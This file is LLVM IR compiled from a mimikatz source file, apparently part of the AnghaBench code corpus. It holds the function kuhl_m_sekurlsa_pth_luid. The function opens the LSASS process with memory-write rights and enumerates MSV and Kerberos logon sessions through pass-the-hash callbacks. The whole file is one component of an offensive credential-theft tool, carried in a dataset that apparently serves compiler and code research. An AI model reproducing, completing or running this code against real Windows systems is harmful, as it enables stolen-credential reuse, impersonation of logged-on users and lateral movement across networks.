; ModuleID = '/home/carl/AnghaBench/mimikatz/mimikatz/modules/sekurlsa/extr_kuhl_m_sekurlsa.c_kuhl_m_sekurlsa_pth_luid.c'
source_filename = "/home/carl/AnghaBench/mimikatz/mimikatz/modules/sekurlsa/extr_kuhl_m_sekurlsa.c_kuhl_m_sekurlsa_pth_luid.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_15__ = type { %struct.TYPE_11__* }
%struct.TYPE_11__ = type { i64, %struct.TYPE_10__* }
%struct.TYPE_10__ = type { i32 }
%struct.TYPE_13__ = type { %struct.TYPE_12__* }
%struct.TYPE_12__ = type { i32, i32 }
%struct.TYPE_14__ = type { i32 }

@FALSE = common dso_local global i32 0, align 4
@cLsass = common dso_local global %struct.TYPE_15__ zeroinitializer, align 8
@KULL_M_MEMORY_TYPE_PROCESS = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [18 x i32] [i32 32, i32 32, i32 124, i32 32, i32 32, i32 76, i32 83, i32 65, i32 32, i32 80, i32 114, i32 111, i32 99, i32 101, i32 115, i32 115, i32 32, i32 0], align 4
@ObjectBasicInformation = common dso_local global i32 0, align 4
@PROCESS_VM_OPERATION = common dso_local global i32 0, align 4
@PROCESS_VM_WRITE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [17 x i32] [i32 119, i32 97, i32 115, i32 32, i32 97, i32 108, i32 114, i32 101, i32 97, i32 100, i32 121, i32 32, i32 82, i32 47, i32 87, i32 10, i32 0], align 4
@TRUE = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [12 x i32] [i32 105, i32 115, i32 32, i32 110, i32 111, i32 119, i32 32, i32 82, i32 47, i32 87, i32 10, i32 0], align 4
@.str.3 = private unnamed_addr constant [12 x i32] [i32 79, i32 112, i32 101, i32 110, i32 80, i32 114, i32 111, i32 99, i32 101, i32 115, i32 115, i32 0], align 4
@.str.4 = private unnamed_addr constant [21 x i32] [i32 78, i32 116, i32 81, i32 117, i32 101, i32 114, i32 121, i32 79, i32 98, i32 106, i32 101, i32 99, i32 116, i32 58, i32 32, i32 37, i32 48, i32 56, i32 120, i32 10, i32 0], align 4
@.str.5 = private unnamed_addr constant [31 x i32] [i32 32, i32 32, i32 124, i32 32, i32 32, i32 76, i32 85, i32 73, i32 68, i32 32, i32 37, i32 117, i32 32, i32 59, i32 32, i32 37, i32 117, i32 32, i32 40, i32 37, i32 48, i32 56, i32 120, i32 58, i32 37, i32 48, i32 56, i32 120, i32 41, i32 10, i32 0], align 4
@.str.6 = private unnamed_addr constant [17 x i32] [i32 32, i32 32, i32 92, i32 95, i32 32, i32 109, i32 115, i32 118, i32 49, i32 95, i32 48, i32 32, i32 32, i32 32, i32 45, i32 32, i32 0], align 4
@kuhl_m_sekurlsa_enum_callback_msv_pth = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [2 x i32] [i32 10, i32 0], align 4
@.str.8 = private unnamed_addr constant [17 x i32] [i32 32, i32 32, i32 92, i32 95, i32 32, i32 107, i32 101, i32 114, i32 98, i32 101, i32 114, i32 111, i32 115, i32 32, i32 45, i32 32, i32 0], align 4
@kuhl_m_sekurlsa_enum_callback_kerberos_pth = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [49 x i32] [i32 109, i32 101, i32 109, i32 111, i32 114, i32 121, i32 32, i32 104, i32 97, i32 110, i32 100, i32 108, i32 101, i32 32, i32 105, i32 115, i32 32, i32 110, i32 111, i32 116, i32 32, i32 75, i32 85, i32 76, i32 76, i32 95, i32 77, i32 95, i32 77, i32 69, i32 77, i32 79, i32 82, i32 89, i32 95, i32 84, i32 89, i32 80, i32 69, i32 95, i32 80, i32 82, i32 79, i32 67, i32 69, i32 83, i32 83, i32 10, i32 0], align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @kuhl_m_sekurlsa_pth_luid(%struct.TYPE_13__* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.TYPE_13__*, align 8
  %4 = alloca %struct.TYPE_14__, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store %struct.TYPE_13__* %0, %struct.TYPE_13__** %3, align 8
  %9 = load i32, i32* @FALSE, align 4
  store i32 %9, i32* %8, align 4
  %10 = call i32 (...) @kuhl_m_sekurlsa_acquireLSA()
  %11 = call i64 @NT_SUCCESS(i32 %10)
  %12 = icmp ne i64 %11, 0
  br i1 %12, label %13, label %114

13:                                               ; preds = %1
  %14 = load %struct.TYPE_11__*, %struct.TYPE_11__** getelementptr inbounds (%struct.TYPE_15__, %struct.TYPE_15__* @cLsass, i32 0, i32 0), align 8
  %15 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %14, i32 0, i32 0
  %16 = load i64, i64* %15, align 8
  %17 = load i64, i64* @KULL_M_MEMORY_TYPE_PROCESS, align 8
  %18 = icmp eq i64 %16, %17
  br i1 %18, label %19, label %114

19:                                               ; preds = %13
  %20 = call i32 (i8*, ...) @kprintf(i8* bitcast ([18 x i32]* @.str to i8*))
  %21 = load %struct.TYPE_11__*, %struct.TYPE_11__** getelementptr inbounds (%struct.TYPE_15__, %struct.TYPE_15__* @cLsass, i32 0, i32 0), align 8
  %22 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %21, i32 0, i32 1
  %23 = load %struct.TYPE_10__*, %struct.TYPE_10__** %22, align 8
  %24 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %23, i32 0, i32 0
  %25 = load i32, i32* %24, align 4
  %26 = load i32, i32* @ObjectBasicInformation, align 4
  %27 = call i32 @NtQueryObject(i32 %25, i32 %26, %struct.TYPE_14__* %4, i32 4, i32* %5)
  store i32 %27, i32* %7, align 4
  %28 = load i32, i32* %7, align 4
  %29 = call i64 @NT_SUCCESS(i32 %28)
  %30 = icmp ne i64 %29, 0
  br i1 %30, label %31, label %75

31:                                               ; preds = %19
  %32 = getelementptr inbounds %struct.TYPE_14__, %struct.TYPE_14__* %4, i32 0, i32 0
  %33 = load i32, i32* %32, align 4
  %34 = load i32, i32* @PROCESS_VM_OPERATION, align 4
  %35 = load i32, i32* @PROCESS_VM_WRITE, align 4
  %36 = or i32 %34, %35
  %37 = and i32 %33, %36
  store i32 %37, i32* %8, align 4
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %39, label %41

39:                                               ; preds = %31
  %40 = call i32 (i8*, ...) @kprintf(i8* bitcast ([17 x i32]* @.str.1 to i8*))
  br label %74

41:                                               ; preds = %31
  %42 = getelementptr inbounds %struct.TYPE_14__, %struct.TYPE_14__* %4, i32 0, i32 0
  %43 = load i32, i32* %42, align 4
  %44 = load i32, i32* @PROCESS_VM_OPERATION, align 4
  %45 = or i32 %43, %44
  %46 = load i32, i32* @PROCESS_VM_WRITE, align 4
  %47 = or i32 %45, %46
  %48 = load i32, i32* @FALSE, align 4
  %49 = load %struct.TYPE_11__*, %struct.TYPE_11__** getelementptr inbounds (%struct.TYPE_15__, %struct.TYPE_15__* @cLsass, i32 0, i32 0), align 8
  %50 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %49, i32 0, i32 1
  %51 = load %struct.TYPE_10__*, %struct.TYPE_10__** %50, align 8
  %52 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %51, i32 0, i32 0
  %53 = load i32, i32* %52, align 4
  %54 = call i32 @GetProcessId(i32 %53)
  %55 = call i32 @OpenProcess(i32 %47, i32 %48, i32 %54)
  store i32 %55, i32* %6, align 4
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %71

57:                                               ; preds = %41
  %58 = load i32, i32* @TRUE, align 4
  store i32 %58, i32* %8, align 4
  %59 = load %struct.TYPE_11__*, %struct.TYPE_11__** getelementptr inbounds (%struct.TYPE_15__, %struct.TYPE_15__* @cLsass, i32 0, i32 0), align 8
  %60 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %59, i32 0, i32 1
  %61 = load %struct.TYPE_10__*, %struct.TYPE_10__** %60, align 8
  %62 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %61, i32 0, i32 0
  %63 = load i32, i32* %62, align 4
  %64 = call i32 @CloseHandle(i32 %63)
  %65 = load i32, i32* %6, align 4
  %66 = load %struct.TYPE_11__*, %struct.TYPE_11__** getelementptr inbounds (%struct.TYPE_15__, %struct.TYPE_15__* @cLsass, i32 0, i32 0), align 8
  %67 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %66, i32 0, i32 1
  %68 = load %struct.TYPE_10__*, %struct.TYPE_10__** %67, align 8
  %69 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %68, i32 0, i32 0
  store i32 %65, i32* %69, align 4
  %70 = call i32 (i8*, ...) @kprintf(i8* bitcast ([12 x i32]* @.str.2 to i8*))
  br label %73

71:                                               ; preds = %41
  %72 = call i32 @PRINT_ERROR_AUTO(i8* bitcast ([12 x i32]* @.str.3 to i8*))
  br label %73

73:                                               ; preds = %71, %57
  br label %74

74:                                               ; preds = %73, %39
  br label %78

75:                                               ; preds = %19
  %76 = load i32, i32* %7, align 4
  %77 = call i32 (i8*, ...) @PRINT_ERROR(i8* bitcast ([21 x i32]* @.str.4 to i8*), i32 %76)
  br label %78

78:                                               ; preds = %75, %74
  %79 = load i32, i32* %8, align 4
  %80 = icmp ne i32 %79, 0
  br i1 %80, label %81, label %113

81:                                               ; preds = %78
  %82 = load %struct.TYPE_13__*, %struct.TYPE_13__** %3, align 8
  %83 = getelementptr inbounds %struct.TYPE_13__, %struct.TYPE_13__* %82, i32 0, i32 0
  %84 = load %struct.TYPE_12__*, %struct.TYPE_12__** %83, align 8
  %85 = getelementptr inbounds %struct.TYPE_12__, %struct.TYPE_12__* %84, i32 0, i32 1
  %86 = load i32, i32* %85, align 4
  %87 = load %struct.TYPE_13__*, %struct.TYPE_13__** %3, align 8
  %88 = getelementptr inbounds %struct.TYPE_13__, %struct.TYPE_13__* %87, i32 0, i32 0
  %89 = load %struct.TYPE_12__*, %struct.TYPE_12__** %88, align 8
  %90 = getelementptr inbounds %struct.TYPE_12__, %struct.TYPE_12__* %89, i32 0, i32 0
  %91 = load i32, i32* %90, align 4
  %92 = load %struct.TYPE_13__*, %struct.TYPE_13__** %3, align 8
  %93 = getelementptr inbounds %struct.TYPE_13__, %struct.TYPE_13__* %92, i32 0, i32 0
  %94 = load %struct.TYPE_12__*, %struct.TYPE_12__** %93, align 8
  %95 = getelementptr inbounds %struct.TYPE_12__, %struct.TYPE_12__* %94, i32 0, i32 1
  %96 = load i32, i32* %95, align 4
  %97 = load %struct.TYPE_13__*, %struct.TYPE_13__** %3, align 8
  %98 = getelementptr inbounds %struct.TYPE_13__, %struct.TYPE_13__* %97, i32 0, i32 0
  %99 = load %struct.TYPE_12__*, %struct.TYPE_12__** %98, align 8
  %100 = getelementptr inbounds %struct.TYPE_12__, %struct.TYPE_12__* %99, i32 0, i32 0
  %101 = load i32, i32* %100, align 4
  %102 = call i32 (i8*, ...) @kprintf(i8* bitcast ([31 x i32]* @.str.5 to i8*), i32 %86, i32 %91, i32 %96, i32 %101)
  %103 = call i32 (i8*, ...) @kprintf(i8* bitcast ([17 x i32]* @.str.6 to i8*))
  %104 = load i32, i32* @kuhl_m_sekurlsa_enum_callback_msv_pth, align 4
  %105 = load %struct.TYPE_13__*, %struct.TYPE_13__** %3, align 8
  %106 = call i32 @kuhl_m_sekurlsa_enum(i32 %104, %struct.TYPE_13__* %105)
  %107 = call i32 (i8*, ...) @kprintf(i8* bitcast ([2 x i32]* @.str.7 to i8*))
  %108 = call i32 (i8*, ...) @kprintf(i8* bitcast ([17 x i32]* @.str.8 to i8*))
  %109 = load i32, i32* @kuhl_m_sekurlsa_enum_callback_kerberos_pth, align 4
  %110 = load %struct.TYPE_13__*, %struct.TYPE_13__** %3, align 8
  %111 = call i32 @kuhl_m_sekurlsa_enum(i32 %109, %struct.TYPE_13__* %110)
  %112 = call i32 (i8*, ...) @kprintf(i8* bitcast ([2 x i32]* @.str.7 to i8*))
  br label %113

113:                                              ; preds = %81, %78
  br label %116

114:                                              ; preds = %13, %1
  %115 = call i32 (i8*, ...) @PRINT_ERROR(i8* bitcast ([49 x i32]* @.str.9 to i8*))
  br label %116

116:                                              ; preds = %114, %113
  %117 = load i32, i32* %2, align 4
  ret i32 %117
}

declare dso_local i64 @NT_SUCCESS(i32) #1

declare dso_local i32 @kuhl_m_sekurlsa_acquireLSA(...) #1

declare dso_local i32 @kprintf(i8*, ...) #1

declare dso_local i32 @NtQueryObject(i32, i32, %struct.TYPE_14__*, i32, i32*) #1

declare dso_local i32 @OpenProcess(i32, i32, i32) #1

declare dso_local i32 @GetProcessId(i32) #1

declare dso_local i32 @CloseHandle(i32) #1

declare dso_local i32 @PRINT_ERROR_AUTO(i8*) #1

declare dso_local i32 @PRINT_ERROR(i8*, ...) #1

declare dso_local i32 @kuhl_m_sekurlsa_enum(i32, %struct.TYPE_13__*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
